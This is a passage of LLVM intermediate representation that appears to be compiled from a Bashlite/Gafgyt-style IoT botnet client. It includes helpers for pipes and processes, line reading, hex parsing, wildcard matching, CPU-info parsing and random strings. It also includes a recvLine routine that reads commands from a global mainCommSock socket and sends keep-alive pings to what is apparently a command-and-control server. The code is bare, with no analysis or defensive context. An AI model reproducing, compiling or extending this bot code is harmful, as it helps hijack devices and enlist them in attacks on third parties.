  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %114 = load i32, i32* %113, align 4
  %115 = call i32 @close(i32 noundef %114)
  br label %116

116:                                              ; preds = %110, %104
  %117 = load i32, i32* %9, align 4
  %118 = load i32*, i32** @fdopen_pids, align 8
  %119 = load i32, i32* %6, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  store i32 %117, i32* %121, align 4
  %122 = load i32, i32* %6, align 4
  store i32 %122, i32* %3, align 4
  br label %123

123:                                              ; preds = %116, %56, %47, %37, %30, %25
  %124 = load i32, i32* %3, align 4
  ret i32 %124
}

; Function Attrs: nounwind
declare i32 @pipe(i32* noundef) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @dup2(i32 noundef, i32 noundef) #4

; Function Attrs: noreturn
declare void @_exit(i32 noundef) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 noundef %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* noundef %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 1) #12
  %26 = call i32 @sigprocmask(i32 noundef 0, %struct.__sigset_t* noundef %6, %struct.__sigset_t* noundef %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 noundef %32, i32* noundef %7, i32 noundef 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !19

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 noundef 2, %struct.__sigset_t* noundef %5, %struct.__sigset_t* noundef null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t* noundef) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef) #4

declare i32 @waitpid(i32 noundef, i32* noundef, i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !20

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i64 @parseHex(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !21

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @wildString(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* noundef %15, i8* noundef %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* noundef %25, i8* noundef %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* noundef %44, i8* noundef %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 noundef %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 noundef %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* noundef %66, i8* noundef %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getHost(i8* noundef %0, %struct.in_addr* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* noundef %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @uppercase(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 noundef %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !22

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getBogos(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 noundef 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* noundef %9, i32 noundef 4096, i32 noundef %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* noundef %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* noundef %15, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !23

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* noundef %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* noundef %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* noundef %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !24

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* noundef %70, i32 noundef 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* noundef %74, i32 noundef 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* noundef %77, i8* noundef %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 noundef %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !25

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 noundef %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8* noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8* noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 noundef 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* noundef %6, i32 noundef 4096, i32 noundef %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* noundef %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* noundef %12, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !26

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 noundef %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomStr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !27

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recvLine(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.__sigset_t*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.__sigset_t*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.__sigset_t* %8, %struct.__sigset_t** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.__sigset_t*, %struct.__sigset_t** %11, align 8
  %31 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !28

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 noundef %52, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %60, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.__sigset_t* %8, %struct.__sigset_t** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.__sigset_t*, %struct.__sigset_t** %15, align 8
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !29

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 noundef %92, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !30

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 noundef %107, i8* noundef %16, i64 noundef 1, i32 noundef 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !31

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i32 @select(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.timeval* noundef) #3

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
